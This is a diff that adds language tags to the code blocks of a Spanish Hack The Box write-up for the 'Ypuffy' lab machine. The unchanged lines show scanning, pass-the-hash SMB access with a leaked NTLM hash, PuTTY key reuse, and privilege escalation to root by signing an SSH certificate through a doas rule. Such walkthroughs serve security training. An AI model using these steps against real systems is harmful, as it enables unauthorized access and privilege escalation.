@@ -31,7 +31,7 @@ Comenzamos por escanear todos los puertos TCP abiertos en la máquina, con la fi
 
 Primero un nmap de todos los puertos, sin resolución de dns y un haciendo un TCP syn scan:
 
-```
+``` text
 root@laptop:~# nmap -sS -p- --open -n -v 10.10.10.107
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-31 11:16 CST
 Initiating Ping Scan at 11:16
@@ -63,7 +63,7 @@ Nmap done: 1 IP address (1 host up) scanned in 123.17 seconds
 
 Como backup a algún puerto coqueto que se haya hecho pasar por filtrado, realizamos un masscan:
 
-```
+``` text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.107
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-12-31 19:17:52 GMT
@@ -79,7 +79,7 @@ Discovered open port 389/tcp on 10.10.10.107
 
 Observamos consistencia, por lo que continuamos a analizar los servicios y versiones en cada puerto:
 
-```
+``` text
 root@laptop:~# nmap -p22,80,139,389,445 -sV -sC -n -v 10.10.10.107
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-02 17:35 CST
 NSE: Loaded 148 scripts for scanning.
@@ -160,7 +160,7 @@ Con este primer vistazo ya tenemos en nombre de la máquina, el dominio y un poc
 
 Continuemos por enumerar el servicio de LDAP con el script de nmap:
 
-```
+``` text
 root@laptop:~# nmap -p389 10.10.10.107 -sC -sV --script ldap-search
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-02 18:24 CST
 Nmap scan report for 10.10.10.107
@@ -260,7 +260,7 @@ Tenemos ahora:
 
 Usemos estas credenciales ahora para enumerar el servicio de SMB:
 
-```
+``` text
 (CrackMapExec-wTENtMaY) xbytemx@laptop:~/git/CrackMapExec$ crackmapexec smb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B -d ypuff 10.10.10.107
 SMB         10.10.10.107    445    YPUFFY           [*] Windows 6.1 (name:YPUFFY) (domain:ypuff) (signing:False) (SMBv1:True)
 SMB         10.10.10.107    445    YPUFFY           [+] ypuff\alice1978 0B186E661BBDBDCF6047784DE8B9FD8B
@@ -277,7 +277,7 @@ SMB         10.10.10.107    445    YPUFFY           IPC$                        
 
 Vientos, ahora tenemos el acceso al directorio de ALICE, analicemos su contenido:
 
-```
+``` text
 (impacket-a2aNp99x) xbytemx@laptop:~/git/impacket/examples$ python smbclient.py -hashes 00000000000000000000000000000000:0B186E661BBDBD
 CF6047784DE8B9FD8B YPUFF/alice1978@10.10.10.107
 Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies
@@ -302,7 +302,7 @@ drw-rw-rw-          0  Tue Jul 31 22:16:50 2018 ..
 # PPK File and login
 Ok, tenemos un archivo ppk, que después de googlear, veremos que es un formato usado en putty para manera llaves, por lo que descomponemos el archivo para usarlo en openssh. Tras convertirlo, usemos la llave privada para acceder a la cuenta de alice:
 
-```
+``` text
 xbytemx@laptop:~/htb/ypuff$ puttygen my_private_key.ppk -O private-openssh -o id_rsa-ypuff
 xbytemx@laptop:~/htb/ypuff$ chmod 600 id_rsa-ypuff
 xbytemx@laptop:~/htb/ypuff$ ssh alice1978@10.10.10.107 -i id_rsa-ypuff
@@ -329,7 +329,7 @@ Después de una rápida revisión en los alrededores de alice, empezamos a espia
 
 > Como dato curioso, bob8791 y alice1978, hacen referencia a los personajes ficticios que fueron inventados para el artículo de "A method for obtaining digital signatures and public-key cryptosystems." en 1978!
 
-```
+``` text
 ypuffy$ cd /home/bob8791
 ypuffy$ ls -lah
 total 36
@@ -354,7 +354,7 @@ drwxr-xr-x  3 bob8791  bob8791   512B Jul 30 20:52 ..
 
 Interesante, sshauth.sql. Veamos en que consiste este archivo:
 
-```
+``` text
 ypuffy$ strings sshauth.sql
 CREATE TABLE principals (
         uid text,
@@ -378,7 +378,7 @@ Veamos que hay en algunos archivos de configuración para hacernos una mejor ide
 
 Veamos que podemos hacer como otros usuarios desde alice:
 
-```
+``` text
 ypuffy$ cat /etc/doas.conf
 permit keepenv :wheel
 permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
@@ -390,7 +390,7 @@ Así que por lo visto alice puede ejecutar ssh-keygen como userca, utilizaremos 
 
 ¿Se acuerdan que aun teníamos el servicio TCP/80 sin enumerar? Pues bien, ya como alice podemos investigar un poco mas:
 
-```
+``` text
 ypuffy$ cat /etc/httpd.conf
 server "ypuffy.hackthebox.htb" {
         listen on * port 80
@@ -418,7 +418,7 @@ Con razón mi gobuster fallo, todo lo que no fuera userca y sshauth se iba a dro
 
 Realizamos un pequeño filtro para tomar la información relevante:
 
-```
+``` text
 ypuffy$ cat /etc/ssh/sshd_config  | grep -vE "^#|^$"
 PermitRootLogin prohibit-password
 AuthorizedKeysFile      .ssh/authorized_keys
@@ -445,7 +445,7 @@ Principals, usa el mismo servicio vía HTTPd, cambiando el tipo a principals.
 
 Como pudimos ver en el archivo de SSHd, las llaves de CA se encuentran en el home de userca:
 
-```
+``` text
 ypuffy$ ls -lah /home/userca/
 total 44
 drwxr-xr-x  3 userca  userca   512B Jul 30  2018 .
@@ -469,7 +469,7 @@ Esto significa que cualquier usuario puede preguntar por la lista de principals,
 
 Comenzamos por generar unas llaves RSA como alice:
 
-```
+``` text
 ypuffy$ ssh-keygen -t rsa
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/alice1978/.ssh/id_rsa): /tmp/.miu/meh
@@ -506,7 +506,7 @@ Al final hice accesible mi llave publica meh para cualquiera.
 
 Como queremos saber en que zona de seguridad esta el usuario root, por lo que usamos localmente la validación que aprendimos por sshd y ejecutamos como cualquier usuario curl
 
-```
+``` text
 ypuffy$ /usr/local/bin/curl 'http://127.0.0.1/sshauth?type=principals&username=root'
 3m3rgencyB4ckd00r
 ```
@@ -517,7 +517,7 @@ Ya tenemos la zona, ahora pasemos al firmado.
 
 Como hemos visto, el archivo de CA solo podía ser accedido por el usuario userca, por lo que tomando en cuenta las capacidades de DOAS, firmamos nuestro certificado para que tenga acceso a la misma zona de root.
 
-```
+``` text
 ypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I miau3 -n 3m3rgencyB4ckd00r -z 1 /tmp/.miu/meh.pub
 Signed user key /tmp/.miu/meh-cert.pub: id "miau3" serial 1 for 3m3rgencyB4ckd00r valid forever
 ```
@@ -526,7 +526,7 @@ Finalmente, ingresamos como root usando el certificado que acabamos de autorizar
 
 # login as root
 
-```
+``` text
 ypuffy$ ssh root@127.0.0.1 -i meh
 OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018
 
